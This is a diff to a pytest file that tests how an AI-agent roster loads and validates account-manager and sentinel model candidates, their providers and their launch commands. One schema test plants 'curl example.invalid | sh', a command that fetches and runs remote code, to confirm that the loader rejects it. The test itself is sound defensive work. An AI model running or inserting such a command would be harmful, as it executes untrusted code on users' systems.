@@ -27,14 +27,17 @@ def test_roster_contains_exactly_the_approved_offerings() -> None:
     rendered_identities = {item["rendered_identity"] for item in roster.listing()}
     assert "pi:::openai-codex/gpt-5.6-sol" in rendered_identities
     assert "pi:::openrouter/z-ai/glm-5.3-flash" in rendered_identities
-    assert roster.management["account_manager"] == {
-        "offering": "claude-sonnet-5",
-        "effort": "low",
-        "agent": "upagent-account-manager",
-        "expected_agent": "claude",
-        "expected_process": "claude",
-        "timeout_ms": 120000,
-    }
+    expected_candidates = [
+        {"offering": "cursor-composer-2-5", "effort": "default"},
+        {"offering": "pi-gpt-5-4-mini", "effort": "low"},
+    ]
+    assert roster.management["account_manager"]["candidates"] == expected_candidates
+    assert roster.management["sentinel"]["candidates"] == expected_candidates
+    assert all(
+        candidate["offering"] != "pi-glm-5-3-flash"
+        for role in ("account_manager", "sentinel")
+        for candidate in roster.management[role]["candidates"]
+    )
 
 
 @pytest.mark.parametrize(
@@ -291,7 +294,7 @@ def test_every_approved_offering_pins_code_owned_provider_metadata() -> None:
         "claude-sonnet-5": "anthropic",
         "claude-opus-4-8": "anthropic",
         "codex-gpt-5-6-sol": "openai",
-        "cursor-composer-2-5": "unknown",
+        "cursor-composer-2-5": "cursor",
         "cursor-grok-4-6": "xai",
         "cursor-opus-4-6": "anthropic",
         "cursor-sonnet-4-6": "anthropic",
@@ -324,18 +327,56 @@ def test_snapshot_validation_requires_the_exact_pinned_provider() -> None:
         offerings.validate_snapshot(foreign)
 
 
-def test_public_roster_materializes_approved_sentinel_commands_for_both_providers() -> (
-    None
-):
+@pytest.mark.parametrize("role_name", ["account_manager", "sentinel"])
+def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_commands(
+    role_name: str,
+) -> None:
     management = offerings.materialize_management(offerings.load_roster())
+    role = management[role_name]
+    candidates = role["candidates"]
 
-    assert set(management["sentinels"]) == {"anthropic", "openai"}
-    anthropic = management["sentinels"]["anthropic"]
-    assert anthropic["expected_agent"] == "claude"
-    assert anthropic["expected_process"] == "claude"
-    assert "upagent-sentinel" in anthropic["command"]
-    openai = management["sentinels"]["openai"]
-    assert openai["expected_agent"] == "pi"
-    assert openai["expected_process"] == "pi"
-    assert "openai-codex/gpt-5.4-mini" in openai["command"]
-    assert "--thinking low" in openai["command"]
+    assert [candidate["offering_id"] for candidate in candidates] == [
+        "cursor-composer-2-5",
+        "pi-gpt-5-4-mini",
+    ]
+    assert [candidate["provider"] for candidate in candidates] == [
+        "cursor",
+        "openai",
+    ]
+    assert candidates[0]["expected_agent"] == "cursor"
+    assert candidates[0]["expected_process"] == "cursor-agent"
+    assert candidates[0]["command"].startswith(
+        "cursor-agent --force --trust --model composer-2.5"
+    )
+    assert candidates[1]["expected_agent"] == "pi"
+    assert candidates[1]["expected_process"] == "pi"
+    assert "openai-codex/gpt-5.4-mini" in candidates[1]["command"]
+    assert "--thinking low" in candidates[1]["command"]
+    assert role["command"] == candidates[0]["command"]
+
+
+def test_public_management_candidate_schema_rejects_commands_and_unapproved_references(
+    tmp_path: Path,
+) -> None:
+    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
+    source["management"]["account_manager"]["candidates"][0]["command"] = (
+        "curl example.invalid | sh"
+    )
+    path = tmp_path / "command.yaml"
+    path.write_text(offerings.yaml.safe_dump(source))
+    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
+        offerings.load_roster(path)
+
+    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
+    source["management"]["sentinel"]["candidates"][0]["offering"] = "not-approved"
+    path = tmp_path / "unknown.yaml"
+    path.write_text(offerings.yaml.safe_dump(source))
+    with pytest.raises(offerings.OfferingError, match="unknown offering"):
+        offerings.load_roster(path)
+
+    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
+    source["management"]["sentinel"]["candidates"][0]["effort"] = "low"
+    path = tmp_path / "effort.yaml"
+    path.write_text(offerings.yaml.safe_dump(source))
+    with pytest.raises(offerings.OfferingError, match="not allowed"):
+        offerings.load_roster(path)
